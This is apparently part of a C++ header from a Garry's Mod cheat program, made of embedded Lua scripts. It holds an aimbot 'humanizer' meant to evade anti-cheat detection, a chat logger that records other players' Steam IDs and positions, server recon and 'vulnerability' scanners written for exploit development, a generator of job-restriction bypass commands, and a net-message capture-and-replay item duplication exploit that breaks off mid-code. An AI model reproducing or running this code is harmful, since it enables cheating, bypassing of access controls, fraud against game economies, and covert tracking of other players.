            cam.Start3D2D(pr.p5 + Vector(0,0,20), Angle(0, LocalPlayer():EyeAngles().y - 90, 90), 0.15)
                draw.SimpleText(pr.name.." +5s", "DermaDefault", 0, 0, Color(0,255,0,a), TEXT_ALIGN_CENTER)
            cam.End3D2D()
            cam.Start3D2D(pr.p30 + Vector(0,0,20), Angle(0, LocalPlayer():EyeAngles().y - 90, 90), 0.15)
                draw.SimpleText("+30s", "DermaDefault", 0, 0, Color(255,0,0,a), TEXT_ALIGN_CENTER)
            cam.End3D2D()
        end
    end)
end)
)lua";

inline const char* LUA_MOVEMENT_PREDICT_STOP = R"lua(
pcall(function()
    hook.Remove("Think", "_fdll_predict")
    hook.Remove("PostDrawTranslucentRenderables", "_fdll_predict_draw")
    _fdll_predict = false
    _fdll_predict_results = {}
end)
)lua";

inline const char* LUA_MOVEMENT_PREDICT_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_predict_results then r = "Not running" return end
    local count = 0
    for id, pr in pairs(_fdll_predict_results) do
        count = count + 1
        r = r..pr.name..": vel="..math.floor(pr.vel:Length())
            .." conf="..string.format("%.0f%%", pr.conf * 100).."\n"
    end
    if count == 0 then r = "No players tracked yet" end
end)
return r
)lua";

// -----------------------------------------------------------------------
// 126. Chat Intelligence -- parse chat for actionable intel
// -----------------------------------------------------------------------
inline const char* LUA_CHAT_INTEL_SETUP = R"lua(
pcall(function()
    if _fdll_chatintel then return end
    _fdll_chatintel = true
    _fdll_intel_db = _fdll_intel_db or {}
    _fdll_intel_alerts = _fdll_intel_db or {}
    local keywords = {
        money = {"printer", "printers", "money", "cash", "shipment", "sell", "buy", "rich", "$", "k$", "million"},
        raid = {"raid", "raiding", "breach", "lockpick", "battering", "c4", "keypad", "base"},
        threat = {"kill", "rdm", "shoot", "arrest", "warrant", "wanted", "cops", "police"},
        location = {"spawn", "pd", "bank", "tunnel", "sewer", "roof", "alley", "warehouse", "shop"},
        admin = {"admin", "kick", "ban", "warn", "jail", "freeze", "noclip", "ulx", "!menu", "!ban"},
        social = {"party", "gang", "ally", "friend", "team", "join", "invite", "hire", "bodyguard"}
    }
    hook.Add("OnPlayerChat", "_fdll_chatintel", function(ply, text, isTeam, isDead)
        if not IsValid(ply) then return end
        local lower = string.lower(text)
        local tags = {}
        for cat, words in pairs(keywords) do
            for _, w in ipairs(words) do
                if string.find(lower, w, 1, true) then
                    tags[cat] = true
                    break
                end
            end
        end
        if next(tags) then
            local entry = {
                name = ply:Nick(),
                steam = ply:SteamID(),
                text = text,
                tags = tags,
                time = CurTime(),
                team = isTeam,
                pos = ply:GetPos()
            }
            table.insert(_fdll_intel_db, entry)
            if #_fdll_intel_db > 500 then table.remove(_fdll_intel_db, 1) end
            local tagStr = ""
            for k in pairs(tags) do tagStr = tagStr.."["..string.upper(k).."] " end
            if tags.raid or tags.admin then
                chat.AddText(Color(255,50,50), "[INTEL ALERT] ", Color(255,200,50), tagStr, Color(255,255,255), ply:Nick()..": "..text)
            end
        end
    end)
end)
)lua";

inline const char* LUA_CHAT_INTEL_STOP = R"lua(
pcall(function()
    hook.Remove("OnPlayerChat", "_fdll_chatintel")
    _fdll_chatintel = false
end)
)lua";

inline const char* LUA_CHAT_INTEL_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_intel_db or #_fdll_intel_db == 0 then r = "No intel collected" return end
    local cats = {}
    for _, e in ipairs(_fdll_intel_db) do
        for tag in pairs(e.tags) do
            cats[tag] = (cats[tag] or 0) + 1
        end
    end
    r = "=== INTEL SUMMARY ===\n"
    for cat, count in pairs(cats) do
        r = r..string.upper(cat)..": "..count.." mentions\n"
    end
    r = r.."\n=== RECENT INTEL (last 15) ===\n"
    local start = math.max(1, #_fdll_intel_db - 14)
    for i = start, #_fdll_intel_db do
        local e = _fdll_intel_db[i]
        local tagStr = ""
        for k in pairs(e.tags) do tagStr = tagStr..k.." " end
        r = r..string.format("[%s] %s: %s\n", tagStr, e.name, e.text)
    end
    local players = {}
    for _, e in ipairs(_fdll_intel_db) do
        players[e.name] = (players[e.name] or 0) + 1
    end
    r = r.."\n=== MOST ACTIVE ===\n"
    local sorted = {}
    for name, count in pairs(players) do table.insert(sorted, {name=name, count=count}) end
    table.sort(sorted, function(a,b) return a.count > b.count end)
    for i = 1, math.min(5, #sorted) do
        r = r..sorted[i].name..": "..sorted[i].count.." flagged msgs\n"
    end
end)
return r
)lua";

// -----------------------------------------------------------------------
// 127. Server Vulnerability Scanner -- enumerate net receivers, find exploits
// -----------------------------------------------------------------------
inline const char* LUA_VULN_SCAN = R"lua(
local r = ""
pcall(function()
    r = "=== SERVER VULNERABILITY SCAN ===\n\n"
    -- 1. Net message receivers
    r = r.."[NET RECEIVERS]\n"
    local netCount = 0
    local interesting = {}
    if net.Receivers then
        for name, fn in pairs(net.Receivers) do
            netCount = netCount + 1
            local lower = string.lower(name)
            local dominated = false
            for _, kw in ipairs({"money","give","drop","spawn","buy","admin","ban","kick",
                "teleport","god","noclip","weapon","ammo","health","armor",
                "door","lock","unlock","jail","unjail","setmoney","addmoney"}) do
                if string.find(lower, kw, 1, true) then
                    table.insert(interesting, {name=name, keyword=kw})
                    dominated = true
                    break
                end
            end
        end
    end
    r = r.."Total: "..netCount.." receivers\n"
    r = r.."Interesting: "..#interesting.."\n"
    for _, e in ipairs(interesting) do
        r = r.."  * "..e.name.." (matched: "..e.keyword..")\n"
    end
    -- 2. Console commands
    r = r.."\n[CONSOLE COMMANDS]\n"
    local cmds = {}
    pcall(function()
        local allCmds = concommand.GetTable()
        for name in pairs(allCmds) do
            local lower = string.lower(name)
            for _, kw in ipairs({"give","spawn","god","noclip","teleport","admin","money","weapon","setjob"}) do
                if string.find(lower, kw, 1, true) then
                    table.insert(cmds, name)
                    break
                end
            end
        end
    end)
    r = r.."Exploitable cmds: "..#cmds.."\n"
    for _, c in ipairs(cmds) do r = r.."  * "..c.."\n" end
    -- 3. Global table scan for exposed functions
    r = r.."\n[GLOBAL EXPLOITS]\n"
    local globals = {}
    pcall(function()
        for k, v in pairs(_G) do
            if type(v) == "function" then
                local lower = string.lower(k)
                for _, kw in ipairs({"backdoor","rcon","admin","exploit","hack","execute","rce"}) do
                    if string.find(lower, kw, 1, true) then
                        table.insert(globals, k)
                        break
                    end
                end
            end
        end
    end)
    r = r.."Suspicious globals: "..#globals.."\n"
    for _, g in ipairs(globals) do r = r.."  * "..g.."\n" end
    -- 4. Unrestricted HTTP access check
    r = r.."\n[HTTP ACCESS]\n"
    pcall(function()
        if HTTP then r = r.."HTTP() available (can exfiltrate)\n"
        else r = r.."HTTP() blocked\n" end
        if http and http.Fetch then r = r.."http.Fetch available\n"
        else r = r.."http.Fetch blocked\n" end
    end)
    -- 5. Debug library
    r = r.."\n[DEBUG/IO ACCESS]\n"
    pcall(function()
        if debug and debug.getinfo then r = r.."debug.getinfo: AVAILABLE\n" end
        if debug and debug.getupvalue then r = r.."debug.getupvalue: AVAILABLE (can read upvalues!)\n" end
        if io then r = r.."io library: AVAILABLE (filesystem access!)\n" end
        if os and os.execute then r = r.."os.execute: AVAILABLE (RCE!)\n" end
        if CompileString then r = r.."CompileString: AVAILABLE\n" end
        if RunString then r = r.."RunString: AVAILABLE\n" end
    end)
    -- 6. Timer scan for persistence vectors
    r = r.."\n[ACTIVE TIMERS]\n"
    local timerCount = 0
    pcall(function()
        for _, name in ipairs(timer.GetTable and timer.GetTable() or {}) do
            timerCount = timerCount + 1
        end
    end)
    r = r.."Active timers: "..timerCount.."\n"
end)
return r
)lua";

// -----------------------------------------------------------------------
// 128. Aimbot Humanizer -- Bezier curve aim with micro-jitter
// -----------------------------------------------------------------------
inline const char* LUA_AIM_HUMANIZER_SETUP = R"lua(
pcall(function()
    if _fdll_humanizer then return end
    _fdll_humanizer = true
    _fdll_aim_curve = {}
    _fdll_aim_progress = 0
    _fdll_aim_target_ang = nil
    _fdll_aim_start_ang = nil
    _fdll_aim_duration = 0
    _fdll_aim_start_time = 0
    hook.Add("CreateMove", "_fdll_humanizer", function(cmd)
        if not _fdll_aim_target_ang then return end
        local t = (CurTime() - _fdll_aim_start_time) / math.max(_fdll_aim_duration, 0.01)
        if t >= 1.0 then
            cmd:SetViewAngles(_fdll_aim_target_ang)
            _fdll_aim_target_ang = nil
            return
        end
        -- cubic bezier: P0=start, P1=ctrl1, P2=ctrl2, P3=target
        local function bezier(p0, p1, p2, p3, t)
            local u = 1 - t
            return u*u*u*p0 + 3*u*u*t*p1 + 3*u*t*t*p2 + t*t*t*p3
        end
        local sp = _fdll_aim_start_ang.p
        local sy = _fdll_aim_start_ang.y
        local tp = _fdll_aim_target_ang.p
        local ty = _fdll_aim_target_ang.y
        -- Normalize yaw delta
        local dy = ty - sy
        if dy > 180 then dy = dy - 360 elseif dy < -180 then dy = dy + 360 end
        ty = sy + dy
        -- Control points with randomized overshoot
        local c1p = sp + (tp - sp) * (0.3 + math.Rand(-0.1, 0.1))
        local c1y = sy + dy * (0.25 + math.Rand(-0.1, 0.1))
        local c2p = sp + (tp - sp) * (0.7 + math.Rand(-0.05, 0.1))
        local c2y = sy + dy * (0.75 + math.Rand(-0.05, 0.1))
        local curP = bezier(sp, c1p, c2p, tp, t)
        local curY = bezier(sy, c1y, c2y, ty, t)
        -- Micro-jitter (simulates hand tremor)
        local jitter = math.max(0, 1.0 - t) * 0.15
        curP = curP + math.Rand(-jitter, jitter)
        curY = curY + math.Rand(-jitter, jitter)
        cmd:SetViewAngles(Angle(curP, curY, 0))
    end)
end)
)lua";

inline const char* LUA_AIM_HUMANIZER_STOP = R"lua(
pcall(function()
    hook.Remove("CreateMove", "_fdll_humanizer")
    _fdll_humanizer = false
    _fdll_aim_target_ang = nil
end)
)lua";

// Called from C++ when aimbot picks a target - sets the bezier curve endpoint
inline const char* LUA_AIM_HUMANIZER_SET = R"lua(
pcall(function()
    if not _fdll_humanizer then return end
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    _fdll_aim_start_ang = lp:EyeAngles()
    _fdll_aim_target_ang = Angle(%f, %f, 0)
    local delta = math.abs(_fdll_aim_target_ang.p - _fdll_aim_start_ang.p)
        + math.abs(math.AngleDifference(_fdll_aim_target_ang.y, _fdll_aim_start_ang.y))
    _fdll_aim_duration = math.Clamp(delta / 500, 0.04, 0.35)
    _fdll_aim_start_time = CurTime()
end)
)lua";

// -----------------------------------------------------------------------
// 129. Macro Sequencer -- programmable multi-step action sequences
// -----------------------------------------------------------------------
inline const char* LUA_MACRO_SYSTEM_SETUP = R"lua(
pcall(function()
    if _fdll_macros then return end
    _fdll_macros = true
    _fdll_macro_defs = _fdll_macro_defs or {}
    _fdll_macro_running = nil

    -- Built-in macros
    _fdll_macro_defs["raid_prep"] = {
        {type="cmd", val="say /buyshipment ak47", delay=0},
        {type="cmd", val="say /buylockpick", delay=0.5},
        {type="chat", val="[TEAM] Raid starting in 10s...", delay=1.0},
        {type="cmd", val="say /buyammocrate", delay=1.5},
    }
    _fdll_macro_defs["escape"] = {
        {type="cmd", val="say /drop", delay=0},
        {type="cmd", val="say /dropmoney 1", delay=0.3},
        {type="key", val=IN_JUMP, delay=0.5},
        {type="cmd", val="say /job Hobo", delay=1.0},
    }
    _fdll_macro_defs["annoy"] = {
        {type="cmd", val="act dance", delay=0},
        {type="chat", val="get rekt", delay=2.0},
        {type="cmd", val="act laugh", delay=3.0},
    }
    _fdll_macro_defs["lockdown"] = {
        {type="cmd", val="say /lockdown", delay=0},
        {type="chat", val="[TEAM] Lockdown active, all doors sealed", delay=1.0},
    }
    _fdll_macro_defs["sprint_jump"] = {
        {type="key", val=IN_SPEED, delay=0},
        {type="key", val=IN_JUMP, delay=0.1},
        {type="key", val=IN_DUCK, delay=0.15},
        {type="cmd", val="act salute", delay=0.8},
    }
    _fdll_macro_defs["distraction"] = {
        {type="chat", val="ADMIN TO ME PLZ", delay=0},
        {type="cmd", val="act zombie", delay=1.5},
        {type="chat", val="IM STUCK HELP", delay=3.0},
        {type="cmd", val="say /advert NEED ADMIN HELP PLS", delay=5.0},
    }
    _fdll_macro_defs["money_beg"] = {
        {type="chat", val="can someone give me money im new", delay=0},
        {type="cmd", val="act beg", delay=2.0},
        {type="chat", val="pls i just want to buy a gun", delay=5.0},
        {type="cmd", val="act cry", delay=7.0},
    }

    local function executeMacro(name)
        local macro = _fdll_macro_defs[name]
        if not macro then return false end
        if _fdll_macro_running then
            timer.Remove("_fdll_macro_exec")
            _fdll_macro_running = nil
        end
        _fdll_macro_running = name
        for i, step in ipairs(macro) do
            timer.Simple(step.delay, function()
                if _fdll_macro_running ~= name then return end
                if step.type == "cmd" then
                    RunConsoleCommand(unpack(string.Split(step.val, " ")))
                elseif step.type == "chat" then
                    RunConsoleCommand("say", step.val)
                elseif step.type == "key" then
                    local lp = LocalPlayer()
                    if IsValid(lp) then
                        -- Simulate via concommand
                        RunConsoleCommand("+jump")
                        timer.Simple(0.1, function() RunConsoleCommand("-jump") end)
                    end
                end
                if i == #macro then
                    timer.Simple(0.5, function() _fdll_macro_running = nil end)
                end
            end)
        end
        return true
    end
    _fdll_executeMacro = executeMacro
end)
)lua";

inline const char* LUA_MACRO_EXECUTE = R"lua(
local r = "No macro system"
pcall(function()
    if not _fdll_executeMacro then r = "Macro system not loaded" return end
    local ok = _fdll_executeMacro("%s")
    r = ok and "Executing: %s" or "Unknown macro: %s"
end)
return r
)lua";

inline const char* LUA_MACRO_LIST = R"lua(
local r = ""
pcall(function()
    if not _fdll_macro_defs then r = "No macros loaded" return end
    r = "=== AVAILABLE MACROS ===\n"
    for name, steps in pairs(_fdll_macro_defs) do
        r = r..name.." ("..#steps.." steps, "..string.format("%.1fs", steps[#steps].delay).." total)\n"
        for i, s in ipairs(steps) do
            r = r.."  "..i..". ["..s.type.."] "..tostring(s.val).." @ "..s.delay.."s\n"
        end
    end
    if _fdll_macro_running then
        r = r.."\nCURRENTLY RUNNING: ".._fdll_macro_running.."\n"
    end
end)
return r
)lua";

inline const char* LUA_MACRO_STOP = R"lua(
pcall(function()
    timer.Remove("_fdll_macro_exec")
    _fdll_macro_running = nil
    _fdll_macros = false
end)
)lua";

// -----------------------------------------------------------------------
// 130. Server Recon Dump -- dump ALL net msgs, jobs, entities, hooks,
//      convars, gamemodes, addons for custom exploit development
// -----------------------------------------------------------------------
inline const char* LUA_RECON_DUMP = R"lua(
local r = ""
pcall(function()
    r = "=== FULL SERVER RECON DUMP ===\n"
    r = r.."Server: "..(GetHostName and GetHostName() or "?").."\n"
    r = r.."Map: "..game.GetMap().."\n"
    r = r.."Gamemode: "..engine.ActiveGamemode().."\n"
    r = r.."Players: "..#player.GetAll().."/"..game.MaxPlayers().."\n\n"

    -- NET MESSAGES (the goldmine)
    r = r.."=== NET MESSAGES ("..table.Count(net.Receivers or {})..") ===\n"
    local netNames = {}
    for name in pairs(net.Receivers or {}) do table.insert(netNames, name) end
    table.sort(netNames)
    for _, name in ipairs(netNames) do
        r = r.."  "..name.."\n"
    end

    -- JOBS
    r = r.."\n=== DARKRP JOBS ===\n"
    pcall(function()
        if RPExtraTeams then
            for _, job in ipairs(RPExtraTeams) do
                r = r..string.format("  [%d] %s (cmd: %s, salary: %s, max: %s)\n",
                    job.team or -1, job.name or "?", job.command or "?",
                    tostring(job.salary), tostring(job.max))
                if job.weapons then
                    r = r.."      weapons: "..table.concat(job.weapons, ", ").."\n"
                end
            end
        end
    end)

    -- ENTITIES (custom)
    r = r.."\n=== CUSTOM ENTITIES ===\n"
    pcall(function()
        if DarkRPEntities then
            for _, ent in ipairs(DarkRPEntities) do
                r = r..string.format("  %s (class: %s, price: %s, cmd: %s)\n",
                    ent.name or "?", ent.ent or "?", tostring(ent.price), ent.cmd or "?")
            end
        end
    end)

    -- SHIPMENTS
    r = r.."\n=== SHIPMENTS ===\n"
    pcall(function()
        if CustomShipments then
            for _, s in ipairs(CustomShipments) do
                r = r..string.format("  %s (entity: %s, price: %s, amount: %s)\n",
                    s.name or "?", s.entity or "?", tostring(s.price), tostring(s.amount))
            end
        end
    end)

    -- CONVARS (server-side readable)
    r = r.."\n=== INTERESTING CONVARS ===\n"
    local cvars_to_check = {
        "sv_cheats","sv_allowcslua","sv_alltalk","sbox_maxprops","sbox_noclip",
        "darkrp_lockdown","darkrp_maxlaws","darkrp_printerremovetime",
        "darkrp_printamount","darkrp_propertytax","gmod_admin_cleanup",
        "ulx_logdir","sam_prefix","fadmin_prefix"
    }
    for _, cv in ipairs(cvars_to_check) do
        pcall(function()
            local val = GetConVar(cv)
            if val then r = r.."  "..cv.." = "..val:GetString().."\n" end
        end)
    end

    -- HOOKS
    r = r.."\n=== ACTIVE HOOKS (by event) ===\n"
    pcall(function()
        local hookTable = hook.GetTable()
        for event, hooks in pairs(hookTable) do
            local count = table.Count(hooks)
            if count > 0 then
                r = r.."  "..event.." ("..count.."): "
                local names = {}
                for name in pairs(hooks) do table.insert(names, tostring(name)) end
                r = r..table.concat(names, ", ").."\n"
            end
        end
    end)

    -- GLOBAL TABLES (custom addon data)
    r = r.."\n=== CUSTOM GLOBAL TABLES ===\n"
    pcall(function()
        local skip = {_G=true, _VERSION=true, table=true, string=true, math=true,
            os=true, io=true, debug=true, coroutine=true, package=true,
            bit=true, jit=true, ffi=true, net=true, hook=true, timer=true,
            concommand=true, surface=true, draw=true, render=true, cam=true,
            vgui=true, gui=true, input=true, file=true, sql=true, util=true,
            ents=true, player=true, game=true, engine=true, sound=true,
            physenv=true, constraint=true, duplicator=true, cleanup=true,
            properties=true, baseclass=true, list=true, language=true,
            cookie=true, notification=true, numpad=true, scripted_ents=true,
            weapons=true, effects=true, killicon=true, spawnmenu=true,
            controlpanel=true, derma=true, cvars=true, construct=true, undo=true,
            saverestore=true, chat=true, team=true, usermessage=true}
        for k, v in pairs(_G) do
            if type(v) == "table" and not skip[k] and type(k) == "string"
                and string.len(k) > 2 and not string.match(k, "^_") then
                local count = 0
                for _ in pairs(v) do count = count + 1 if count > 5 then break end end
                if count > 0 then
                    r = r.."  "..k.." (table, "..count.."+ entries)\n"
                end
            end
        end
    end)

    -- GAMEMODE FUNCTIONS
    r = r.."\n=== GAMEMODE HOOKS ===\n"
    pcall(function()
        if GAMEMODE then
            local funcs = {}
            for k, v in pairs(GAMEMODE) do
                if type(v) == "function" then table.insert(funcs, k) end
            end
            table.sort(funcs)
            for _, f in ipairs(funcs) do r = r.."  GM:"..f.."\n" end
        end
    end)

    -- ADDON LIST
    r = r.."\n=== INSTALLED ADDONS ===\n"
    pcall(function()
        local addons = engine.GetAddons()
        for _, a in ipairs(addons) do
            if a.mounted then
                r = r.."  "..a.title.." (wsid: "..a.wsid..")\n"
            end
        end
    end)

    -- NW VARIABLES on local player
    r = r.."\n=== LOCAL PLAYER NW VARS ===\n"
    pcall(function()
        local lp = LocalPlayer()
        if not IsValid(lp) then return end
        local dt = lp:GetNWVarTable and lp:GetNWVarTable() or {}
        for k, v in pairs(dt) do
            r = r.."  "..tostring(k).." = "..tostring(v).."\n"
        end
    end)

    -- Save to file for easy access
    file.CreateDir("fdll_recon")
    file.Write("fdll_recon/recon_"..string.Replace(game.GetMap(), "/", "_")..".txt", r)
    r = r.."\n[Saved to garrysmod/data/fdll_recon/]\n"
end)
return r
)lua";

// -----------------------------------------------------------------------
// 131. Custom Job Exploit Generator -- builds exploit scripts for any job
// -----------------------------------------------------------------------
inline const char* LUA_JOB_EXPLOIT_SCAN = R"lua(
local r = ""
pcall(function()
    r = "=== JOB EXPLOIT ANALYSIS ===\n"
    if not RPExtraTeams then r = "No RPExtraTeams found" return end
    for _, job in ipairs(RPExtraTeams) do
        r = r.."\n--- "..job.name.." (team "..tostring(job.team or "?")..") ---\n"
        r = r.."  Command: /"..(job.command or "?").."\n"
        if job.max and job.max > 0 then
            r = r.."  Max slots: "..job.max.."\n"
        end
        if job.admin and job.admin > 0 then
            r = r.."  Admin-only: YES (level "..job.admin..")\n"
            r = r.."  EXPLOIT: Can bypass with customCheck detour\n"
        end
        if job.customCheck then
            r = r.."  Has customCheck: YES\n"
            r = r.."  EXPLOIT: Detour customCheck to always return true\n"
        end
        if job.weapons and #job.weapons > 0 then
            r = r.."  Weapons: "..table.concat(job.weapons, ", ").."\n"
            r = r.."  EXPLOIT: Switch job briefly to get weapons, switch back\n"
        end
        if job.PlayerLoadout then
            r = r.."  Has PlayerLoadout: YES (custom weapon loadout)\n"
        end
        if job.salary then
            r = r.."  Salary: $"..job.salary.."\n"
        end
        -- Check for special abilities
        local special = {}
        if job.hasLicense then table.insert(special, "Gun License") end
        if job.candemote then table.insert(special, "Can Demote") end
        if job.mayor then table.insert(special, "Mayor Powers") end
        if job.chief then table.insert(special, "Police Chief") end
        if job.cp then table.insert(special, "Civil Protection") end
        if job.medic then table.insert(special, "Medic Abilities") end
        if #special > 0 then
            r = r.."  Special: "..table.concat(special, ", ").."\n"
        end
    end
    -- Try to bypass job restrictions
    r = r.."\n=== BYPASS COMMANDS ===\n"
    for _, job in ipairs(RPExtraTeams) do
        if job.customCheck or (job.admin and job.admin > 0) then
            r = r.."RunConsoleCommand('darkrp', '"..job.command.."')  -- force switch\n"
        end
    end
end)
return r
)lua";

// -----------------------------------------------------------------------
// 132. Entity Class Dump -- list all entity classes in the map
// -----------------------------------------------------------------------
inline const char* LUA_ENTITY_CLASS_DUMP = R"lua(
local r = ""
pcall(function()
    r = "=== ENTITY CLASSES IN MAP ===\n"
    local classes = {}
    for _, e in ipairs(ents.GetAll()) do
        local cls = e:GetClass()
        classes[cls] = (classes[cls] or 0) + 1
    end
    local sorted = {}
    for cls, count in pairs(classes) do table.insert(sorted, {c=cls, n=count}) end
    table.sort(sorted, function(a,b) return a.n > b.n end)
    for _, e in ipairs(sorted) do
        r = r..string.format("  %3d x %s\n", e.n, e.c)
    end
    r = r.."\nTotal entities: "..#ents.GetAll().."\n"
    r = r.."Unique classes: "..#sorted.."\n"
    -- Highlight exploitable ones
    r = r.."\n=== EXPLOITABLE ENTITIES ===\n"
    local exploitable = {"money_printer","microwave","drug_lab","meth_lab",
        "weed_plant","shipment","spawned_weapon","spawned_money","fadingdoor",
        "gmod_wire","darkrp_laws","vehicle","darkrp_crate","m9k_","tfa_",
        "weapon_","item_","npc_"}
    for _, e in ipairs(sorted) do
        for _, kw in ipairs(exploitable) do
            if string.find(e.c, kw, 1, true) then
                r = r.."  "..e.c.." x"..e.n.."\n"
                break
            end
        end
    end
end)
return r
)lua";

// -----------------------------------------------------------------------
// 133. NW Variable Exploit -- scan all players for exploitable NW vars
// -----------------------------------------------------------------------
inline const char* LUA_NW_EXPLOIT_SCAN = R"lua(
local r = ""
pcall(function()
    r = "=== NETWORKED VARIABLE SCAN ===\n"
    for _, p in ipairs(player.GetAll()) do
        r = r.."\n--- "..p:Nick().." ---\n"
        pcall(function()
            local nw = p:GetNWVarTable and p:GetNWVarTable() or {}
            for k, v in pairs(nw) do
                r = r.."  "..tostring(k).." = "..tostring(v)
                local lower = string.lower(tostring(k))
                if string.find(lower, "money") or string.find(lower, "salary")
                    or string.find(lower, "wallet") or string.find(lower, "cash") then
                    r = r.." [$$$ MONEY]"
                end
                if string.find(lower, "wanted") or string.find(lower, "arrest")
                    or string.find(lower, "warrant") then
                    r = r.." [POLICE]"
                end
                if string.find(lower, "admin") or string.find(lower, "rank")
                    or string.find(lower, "group") or string.find(lower, "level") then
                    r = r.." [POWER]"
                end
                if string.find(lower, "family") or string.find(lower, "gang")
                    or string.find(lower, "faction") or string.find(lower, "mafia")
                    or string.find(lower, "org") then
                    r = r.." [FACTION]"
                end
                r = r.."\n"
            end
        end)
        -- DarkRP specific
        pcall(function()
            r = r.."  DarkRP Money: $"..tostring(p:getDarkRPVar("money") or "?").."\n"
            r = r.."  DarkRP Job: "..(p:getDarkRPVar("job") or "?").."\n"
            r = r.."  DarkRP Wanted: "..tostring(p:getDarkRPVar("wanted") or false).."\n"
        end)
    end
end)
return r
)lua";

// -----------------------------------------------------------------------
// 134. Dupe Scanner -- find all duplication vectors on current server
// -----------------------------------------------------------------------
inline const char* LUA_DUPE_SCAN = R"lua(
local r = ""
pcall(function()
    r = "=== DUPLICATION VECTOR SCAN ===\n\n"

    -- 1. Find all purchase/spawn net messages (replay targets)
    r = r.."[NET PURCHASE MESSAGES]\n"
    local buyNets = {}
    if net.Receivers then
        for name in pairs(net.Receivers) do
            local low = string.lower(name)
            for _, kw in ipairs({"buy","purchase","spawn","create","order","craft",
                "give","shipment","printer","request","shop","store","item"}) do
                if string.find(low, kw, 1, true) then
                    table.insert(buyNets, name)
                    break
                end
            end
        end
    end
    table.sort(buyNets)
    for _, n in ipairs(buyNets) do r = r.."  * "..n.."\n" end
    r = r.."  Total: "..#buyNets.." replay targets\n"

    -- 2. Check buy console commands
    r = r.."\n[BUY COMMANDS]\n"
    local buyCmds = {}
    pcall(function()
        for name in pairs(concommand.GetTable()) do
            local low = string.lower(name)
            for _, kw in ipairs({"buy","purchase","spawn","order","craft","shop"}) do
                if string.find(low, kw, 1, true) then
                    table.insert(buyCmds, name)
                    break
                end
            end
        end
    end)
    table.sort(buyCmds)
    for _, c in ipairs(buyCmds) do r = r.."  * "..c.."\n" end

    -- 3. Check DarkRP pocket system
    r = r.."\n[POCKET SYSTEM]\n"
    pcall(function()
        local lp = LocalPlayer()
        if lp.getPocketItems then
            r = r.."  darkrp pocket: AVAILABLE\n"
            local items = lp:getPocketItems() or {}
            r = r.."  Current pocket items: "..#items.."\n"
        else
            r = r.."  darkrp pocket: NOT FOUND\n"
        end
        local cfg = DarkRP and DarkRP.getPhrase and true or false
        r = r.."  DarkRP detected: "..tostring(cfg).."\n"
    end)

    -- 4. Check duplicator system access
    r = r.."\n[DUPLICATOR ACCESS]\n"
    pcall(function()
        if duplicator then
            r = r.."  duplicator library: AVAILABLE\n"
            if duplicator.Copy then r = r.."  duplicator.Copy: YES\n" end
            if duplicator.Paste then r = r.."  duplicator.Paste: YES\n" end
            if duplicator.CopyEnts then r = r.."  duplicator.CopyEnts: YES\n" end
            if duplicator.CreateEntityFromTable then r = r.."  duplicator.CreateEntityFromTable: YES (can create!)\n" end
        else
            r = r.."  duplicator library: BLOCKED\n"
        end
    end)

    -- 5. Check for shipments nearby
    r = r.."\n[NEARBY SHIPMENTS]\n"
    local shipments = {}
    for _, e in ipairs(ents.GetAll()) do
        local cls = string.lower(e:GetClass())
        if string.find(cls, "shipment") or string.find(cls, "crate") then
            table.insert(shipments, {ent=e, cls=cls, dist=e:GetPos():Distance(LocalPlayer():GetPos())})
        end
    end
    for _, s in ipairs(shipments) do
        r = r..string.format("  %s [%d] dist=%.0f\n", s.cls, s.ent:EntIndex(), s.dist)
    end
    if #shipments == 0 then r = r.."  None found\n" end

    -- 6. Check for printers nearby
    r = r.."\n[NEARBY PRINTERS]\n"
    local printers = {}
    for _, e in ipairs(ents.GetAll()) do
        local cls = string.lower(e:GetClass())
        if string.find(cls, "printer") or string.find(cls, "bitcoin") or string.find(cls, "miner") then
            local money = 0
            pcall(function() money = e:GetNWInt("PrintAmount", 0) end)
            pcall(function() if money == 0 then money = e:GetNWInt("money", 0) end end)
            table.insert(printers, {ent=e, cls=cls, money=money, dist=e:GetPos():Distance(LocalPlayer():GetPos())})
        end
    end
    for _, p in ipairs(printers) do
        r = r..string.format("  %s [%d] $%d dist=%.0f\n", p.cls, p.ent:EntIndex(), p.money, p.dist)
    end
    if #printers == 0 then r = r.."  None found\n" end

    r = r.."\n[EXPLOIT AVAILABILITY]\n"
    r = r.."  Net Burst Replay: "..(#buyNets > 0 and "YES" or "NO").." ("..#buyNets.." targets)\n"
    r = r.."  Buy Cmd Burst: "..(#buyCmds > 0 and "YES" or "NO").."\n"
    r = r.."  Pocket Dupe: "..(LocalPlayer().getPocketItems and "POSSIBLE" or "NO POCKET").."\n"
    r = r.."  Shipment Extract: "..(#shipments > 0 and "YES" or "NO SHIPMENTS").."\n"
    r = r.."  Printer Collect: "..(#printers > 0 and "YES" or "NO PRINTERS").."\n"
end)
return r
)lua";

// -----------------------------------------------------------------------
// 135. Net Burst Replay -- replay a captured net message N times rapidly
//      (the actual item duplication exploit)
// -----------------------------------------------------------------------
inline const char* LUA_DUPE_NET_BURST_SETUP = R"lua(
pcall(function()
    if _fdll_dupe_capture then return end
    _fdll_dupe_capture = true
    _fdll_dupe_captured = {}
    _fdll_dupe_last_buy = nil

    -- Save originals
    _fdll_dupe_origStart = _fdll_dupe_origStart or net.Start
    _fdll_dupe_origSend  = _fdll_dupe_origSend or net.SendToServer

    -- Capture write calls per message
    local writeHooks = {"WriteString","WriteUInt","WriteInt","WriteFloat",
        "WriteBool","WriteEntity","WriteVector","WriteAngle","WriteTable",
        "WriteDouble","WriteColor","WriteNormal","WriteMatrix","WriteBit",
        "WriteData","WriteType"}
    _fdll_dupe_origWrites = _fdll_dupe_origWrites or {}
    _fdll_dupe_currentMsg = nil

    for _, fn in ipairs(writeHooks) do
        if net[fn] and not _fdll_dupe_origWrites[fn] then
            _fdll_dupe_origWrites[fn] = net[fn]
            net[fn] = function(...)
                if _fdll_dupe_currentMsg then
                    table.insert(_fdll_dupe_currentMsg.ops, {fn=fn, args={...}})
                end
                return _fdll_dupe_origWrites[fn](...)
            end
        end
    end

    net.Start = function(name, ...)
        _fdll_dupe_currentMsg = {name=name, ops={}}
        return _fdll_dupe_origStart(name, ...)
    end

    net.SendToServer = function(...)
        if _fdll_dupe_currentMsg then
            -- Check if this looks like a purchase
            local low = string.lower(_fdll_dupe_currentMsg.name)
            local isBuy = false
            for _, kw in ipairs({"buy","purchase","spawn","create","order","craft",
                "give","shipment","printer","request","shop","store","item","take"}) do
                if string.find(low, kw, 1, true) then isBuy = true break end
            end
            local entry = {
